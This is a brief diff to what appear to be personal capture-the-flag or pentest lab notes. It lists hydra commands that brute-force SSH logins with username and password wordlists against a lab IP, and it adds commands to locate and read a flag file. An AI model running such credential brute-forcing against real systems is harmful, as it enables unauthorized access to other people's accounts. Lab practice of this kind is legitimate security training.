@@ -15,3 +15,5 @@ hydra -L /home/attacker/Desktop/username.txt -P /home/attacker/Desktop/password.
 SSH:
 hydra -L /home/attacker/Desktop/username.txt -P /home/attacker/Desktop/password.txt 10.10.1.11 SSH
 putty with user id and password
+locate flag.txt - command
+cat /path/flag.txt
